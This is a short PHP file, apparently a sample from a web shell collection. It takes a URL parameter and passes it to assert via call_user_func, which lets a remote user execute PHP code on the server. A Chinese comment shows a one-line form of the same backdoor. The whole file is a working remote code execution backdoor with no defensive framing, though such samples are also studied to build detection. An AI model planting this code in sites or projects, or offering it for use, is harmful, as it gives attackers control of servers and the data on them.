<?php
$a = $_GET['a'];
call_user_func(assert,$a);

//书写为一句
//call_user_func(assert,$_GET['a']);

?>